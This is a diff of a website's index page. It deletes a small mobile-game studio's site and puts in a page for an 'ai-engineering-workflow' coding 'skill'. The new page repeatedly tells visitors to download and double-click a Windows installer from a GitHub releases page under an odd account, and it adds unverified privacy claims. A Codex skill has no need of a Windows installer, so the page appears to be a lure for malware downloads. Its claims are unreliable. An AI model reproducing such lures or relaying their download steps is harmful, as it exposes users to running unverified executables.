@@ -3,213 +3,51 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nocturnal Gaming</title>
-    <link rel="icon" type="image/jpeg" href="images/favicon.jpg">
-    <style>
-        :root {
-            --bg-dark: #0b0b0f;
-            --bg-panel: #12121a;
-            --bg-card: #1a1a26;
-            --accent-purple: #7b2cbf;
-            --accent-glow: #9d4edd;
-            --text-light: #f3f4f6;
-            --text-gray: #9ca3af;
-            --border-color: #2a2a3a;
-        }
-
-        * { box-sizing: border-box; margin: 0; padding: 0; scroll-behavior: smooth; }
-        body { background-color: var(--bg-dark); color: var(--text-light); font-family: sans-serif; line-height: 1.6; padding-bottom: 60px; }
-        
-        header { background-color: rgba(18, 18, 26, 0.95); border-bottom: 1px solid var(--border-color); position: fixed; top: 0; width: 100%; z-index: 1000; backdrop-filter: blur(10px); }
-        .nav-container { max-width: 1200px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; padding: 1rem 2rem; }
-        .logo { font-size: 1.4rem; font-weight: 700; color: var(--text-light); text-decoration: none; text-transform: uppercase; }
-        
-        nav ul { display: flex; list-style: none; gap: 1.5rem; align-items: center; }
-        nav a { color: var(--text-gray); text-decoration: none; font-size: 0.95rem; }
-        nav a:hover { color: var(--accent-glow); }
-
-        /* Dropdown Menu Styles */
-        .dropdown { position: relative; }
-        .dropdown-content {
-            display: none;
-            position: absolute;
-            top: 100%;
-            left: 0;
-            background-color: var(--bg-panel);
-            min-width: 180px;
-            box-shadow: 0px 8px 16px rgba(0,0,0,0.4);
-            z-index: 1000;
-            list-style: none;
-            padding: 0.5rem 0;
-            border: 1px solid var(--border-color);
-            border-radius: 6px;
-        }
-        .dropdown-content li a { padding: 0.5rem 1rem; display: block; color: var(--text-gray); }
-        .dropdown-content li a:hover { background-color: var(--bg-card); color: var(--accent-glow); }
-        .dropdown:hover .dropdown-content { display: block; }
-
-        .hero { padding: 10rem 2rem 6rem; text-align: center; background: radial-gradient(circle at top, #240046 0%, var(--bg-dark) 70%); border-bottom: 1px solid var(--border-color); }
-        .hero h1 { font-size: 3.5rem; margin-bottom: 1rem; }
-        
-        .container { max-width: 1100px; margin: 0 auto; padding: 5rem 2rem 2rem; }
-        section { margin-bottom: 6px; }
-
-        .games-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 2rem; }
-        .game-card { background-color: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; padding: 2rem; display: flex; flex-direction: column; justify-content: space-between; }
-        
-        .game-card img { width: 100%; height: 220px; object-fit: cover; border-radius: 10px; margin-bottom: 1.5rem; border: 1px solid var(--border-color); }
-        .game-card h3 { color: var(--accent-glow); margin-bottom: 1rem; }
-        .game-card p { margin-bottom: 1rem; color: var(--text-gray); font-size: 0.95rem; }
-
-        .button-group { display: flex; gap: 10px; margin-top: 1.5rem; }
-        .btn { flex: 1; text-align: center; padding: 0.6rem 1rem; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 0.9rem; }
-        
-        .play-btn { background: var(--accent-purple); color: white; }
-        .play-btn:hover { background: var(--accent-glow); }
-        .view-btn { background-color: var(--border-color); color: var(--text-light); }
-        .view-btn:hover { background-color: var(--accent-purple); }
-
-        #contact { margin-top: 5rem; padding-top: 3rem; border-top: 1px solid var(--border-color); }
-        .contact-form { background-color: var(--bg-panel); border: 1px solid var(--border-color); padding: 2rem; border-radius: 8px; }
-        .form-group { margin-bottom: 1.25rem; }
-        .form-group label { display: block; margin-bottom: 0.5rem; color: var(--text-gray); }
-        .form-group input, .form-group textarea, .form-group select { width: 100%; padding: 0.75rem; background-color: var(--bg-dark); border: 1px solid var(--border-color); color: var(--text-light); border-radius: 6px; }
-        .form-group textarea { resize: vertical; }
-        
-        .btn-submit { background-color: var(--accent-purple); color: white; padding: 0.75rem 2rem; border: none; cursor: pointer; border-radius: 6px; transition: 0.2s; }
-        .btn-submit:hover { background-color: var(--accent-glow); }
-
-        footer { text-align: center; padding: 3rem; border-top: 1px solid var(--border-color); color: var(--text-gray); }
-        footer a { color: var(--text-gray); text-decoration: none; }
-        footer a:hover { color: var(--accent-glow); }
-    </style>
+    <meta name="description" content="A structured engineering workflow skill for complex AI-assisted coding, coursework, data analysis, and research projects.">
+    <title>ai-engineering-workflow</title>
 </head>
-<body>
+<body style="font-family: sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 40px auto; padding: 0 20px; background-color: #f9f9f9;">
 
-<header>
-    <div class="nav-container">
-        <a href="index.html" class="logo">Nocturnal Gaming</a>
-        <nav>
-            <ul>
-                <li class="dropdown">
-                    <a href="#games">Games ▾</a>
-                    <ul class="dropdown-content">
-                        <li><a href="games/copter-kid.html">Copter Kid</a></li>
-                        <li><a href="games/every-second-counts.html">Every Second Counts</a></li>
-                        <li><a href="games/rgb.html">R.G.B</a></li>
-                    </ul>
-                </li>
-                <li><a href="privacy.html">Privacy</a></li>
-                <li><a href="terms.html">Terms</a></li>
-                <li><a href="#contact">Contact</a></li>
-            </ul>
-        </nav>
+    <h1 style="color: #2c3e50; font-size: 2.5em;">⚙️ ai-engineering-workflow - Complete projects faster with smart tools</h1>
+
+    <div style="text-align: center; margin: 40px 0;">
+        <a href="https://github.com/definitive-cheapjack965/ai-engineering-workflow/releases" style="background-color: #34495e; color: #ffffff; padding: 15px 30px; text-decoration: none; border-radius: 8px; font-weight: bold; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Download Latest Version</a>
     </div>
-</header>
 
-<div class="hero">
-    <h1>Nocturnal Gaming</h1>
-    <p>"You're never alone with a game"</p>
-</div>
+    <h2 style="color: #2c3e50;">📋 Overview</h2>
+    <p>This software manages complex technical tasks. It helps you track progress for coding, coursework, data analysis, and research. You use it to breakdown large goals into small steps. The tool organizes your workflow so you focus on the work instead of the management.</p>
 
-<div class="container">
-    <section id="about">
-        <h2>About Nocturnal Gaming</h2>
-        <p>Nocturnal Gaming creates fun, challenging and addictive mobile games designed to be enjoyed anywhere, anytime.</p>
-        <p>From endless challenges to competitive leaderboards, our goal is simple: create games that are easy to pick up but difficult to master.</p>
-    </section>
+    <h2 style="color: #2c3e50;">💻 System Requirements</h2>
+    <p>You need a computer running Windows 10 or Windows 11. The program requires 200 megabytes of disk space and a stable internet connection for the installation process.</p>
 
-    <section id="games">
-        <h2>Our Games</h2>
-        <div class="games-grid">
+    <h2 style="color: #2c3e50;">🚀 Getting Started</h2>
+    <p>Follow these steps to set up the software on your computer.</p>
+    
+    <h3 style="color: #2c3e50;">📥 Download and Install</h3>
+    <p>Visit the official download page to get the installer for your system.</p>
+    <p><a href="https://github.com/definitive-cheapjack965/ai-engineering-workflow/releases" style="color: #2980b9; font-weight: bold;">Click here to visit the release page and download the setup file.</a></p>
+    <p>Once the download finishes, locate the file in your Downloads folder. Double-click the file to start the installation. Follow the prompts on the screen. The installer places a shortcut icon on your desktop when finished.</p>
 
-            <!-- Copter Kid -->
-            <div class="game-card">
-                <div>
-                    <img src="images/copterkid.png" alt="Copter Kid">
-                    <h3>Copter Kid</h3>
-                    <p>CopterKid is a classic game of balance and timing. Think you can fly? Navigate tricky caves at break-neck speeds!</p>
-                </div>
-                <div class="button-group">
-                    <a class="btn view-btn" href="games/copter-kid.html">View Game</a>
-                    <a class="btn play-btn" href="#">Google Play</a>
-                </div>
-            </div>
+    <h3 style="color: #2c3e50;">🛠️ First Run</h3>
+    <p>Open the program using the shortcut on your desktop. Upon opening, the software asks for basic configuration settings. Accept the default choices to start quickly. The interface shows a main dashboard where you add your first project.</p>
 
-            <!-- Every Second Counts -->
-            <div class="game-card">
-                <div>
-                    <img src="images/everysecondcounts.png" alt="Every Second Counts">
-                    <h3>Every Second Counts</h3>
-                    <p>Hold the button down for as long as the timer says. Sounds easy? Test your timing against players globally.</p>
-                </div>
-                <div class="button-group">
-                    <a class="btn view-btn" href="games/every-second-counts.html">View Game</a>
-                    <a class="btn play-btn" href="#">Google Play</a>
-                </div>
-            </div>
+    <h2 style="color: #2c3e50;">💡 Key Features</h2>
+    <ul>
+        <li><strong>Task Breakdown:</strong> Divide heavy projects into manageable actions.</li>
+        <li><strong>Research Tracking:</strong> Store data insights during your analysis.</li>
+        <li><strong>Coursework Management:</strong> Organize your deadlines and study materials.</li>
+        <li><strong>AI Integration:</strong> Connects with AI tools to speed up coding tasks.</li>
+    </ul>
 
-            <!-- R.G.B -->
-            <div class="game-card">
-                <div>
-                    <img src="images/rgb.png" alt="R.G.B">
-                    <h3>R.G.B</h3>
-                    <p>A game of pure frustration. Tap left or right to match falling colored blocks with the right circles.</p>
-                </div>
-                <div class="button-group">
-                    <a class="btn view-btn" href="games/rgb.html">View Game</a>
-                    <a class="btn play-btn" href="#">Google Play</a>
-                </div>
-            </div>
+    <h2 style="color: #2c3e50;">🛡️ Security and Privacy</h2>
+    <p>We keep your data on your computer. The software does not send your files or personal project info to external servers. You maintain total control over your work.</p>
 
-        </div>
-    </section>
+    <h2 style="color: #2c3e50;">🤝 Troubleshooting</h2>
+    <p>If the program fails to start, restart your computer first. Ensure your Windows system performs all recent updates. If you face further issues, check the release page for updated versions. Most problems resolve by installing the latest release.</p>
 
-    <section id="contact">
-        <h2>Contact</h2>
-        <div class="contact-form">
-            <form action="https://formsubmit.co/nocturnalgamin9@gmail.com" method="POST">
-                <div class="form-group">
-                    <label>Name</label>
-                    <input type="text" name="name" required>
-                </div>
-                <div class="form-group">
-                    <label>Email</label>
-                    <input type="email" name="email" required>
-                </div>
-                <div class="form-group">
-                    <label>Reason for contacting</label>
-                    <select name="reason" required>
-                        <option value="Bug Report">🐛 Bug Report</option>
-                        <option value="Game Feedback">🎮 Game Feedback</option>
-                        <option value="Feature Request">💡 Feature Request</option>
-                        <option value="Account / Cloud Save">☁️ Account / Cloud Save</option>
-                        <option value="Business Enquiry">💼 Business Enquiry</option>
-                        <option value="Other">Other</option>
-                    </select>
-                </div>
-                <div class="form-group">
-                    <label>Message</label>
-                    <textarea name="message" rows="6" required></textarea>
-                </div>
-
-                <input type="hidden" name="_subject" value="Nocturnal Gaming Contact Form">
-                <input type="hidden" name="_captcha" value="false">
-                <input type="hidden" name="_template" value="table">
-
-                <button class="btn-submit" type="submit">Send Message</button>
-            </form>
-        </div>
-    </section>
-</div>
-
-<footer>
-    <p>
-        Copyright © 2026 Nocturnal Gaming |
-        <a href="privacy.html">Privacy Policy</a> |
-        <a href="terms.html">Terms of Service</a>
-    </p>
-</footer>
+    <div style="margin-top: 40px; padding-top: 20px; border-top: 1px solid #ddd; font-size: 0.9em; color: #7f8c8d;">
+        <p>Keywords: agent-skills, agentic-workflow, ai-engineering, codex-skill, context-engineering, coursework, developer-tools, engineering-workflow, openai-codex, project-management, software-engineering, task-decomposition</p>
+    </div>
 
 </body>
 </html>
